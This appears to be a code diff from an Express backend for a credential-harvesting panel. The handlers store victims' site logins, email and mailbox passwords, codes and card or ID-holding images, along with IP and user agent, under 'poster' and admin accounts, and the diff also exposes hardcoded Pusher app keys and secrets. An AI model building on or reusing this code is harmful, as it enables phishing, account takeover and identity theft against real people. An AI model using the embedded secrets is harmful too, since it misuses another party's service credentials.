@@ -380,25 +380,25 @@ export const add_data = async (req, res) => {
         useTLS: true,
       })
 
-      const pusherOne = new Pusher({
-        app_id : "1754655",
-        key :"9d5441790277eab2cffa",
-        secret : "423b9b8c22f432fe78f9",
-        cluster : "mt1",
-        useTLS: true,
-      })
+    //   const pusherOne = new Pusher({
+    //     app_id : "1754655",
+    //     key :"9d5441790277eab2cffa",
+    //     secret : "423b9b8c22f432fe78f9",
+    //     cluster : "mt1",
+    //     useTLS: true,
+    //   })
 
-      const pusherTwo = new Pusher({
-        app_id : "1754657",
-        key :"219c68882d2935f2323f",
-        secret : "ee1296a8e6d938d7dad2",
-        cluster : "mt1",
-        useTLS: true,
-      })
+    //   const pusherTwo = new Pusher({
+    //     app_id : "1754657",
+    //     key :"219c68882d2935f2323f",
+    //     secret : "ee1296a8e6d938d7dad2",
+    //     cluster : "mt1",
+    //     useTLS: true,
+    //   })
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard,wrongPassword } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard } = req.body
   const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -417,7 +417,8 @@ export const add_data = async (req, res) => {
                 username,passcode,mail,mailPass,adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard,wrongPassword,
+                onlyCard,holdingCard,
+                // wrongPassword,
                  ip:ipAddress,
                 agent:userAgent
 
@@ -644,7 +645,7 @@ export const poster_details =  async(req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
         const newdata = {...poster, details: details }
         console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
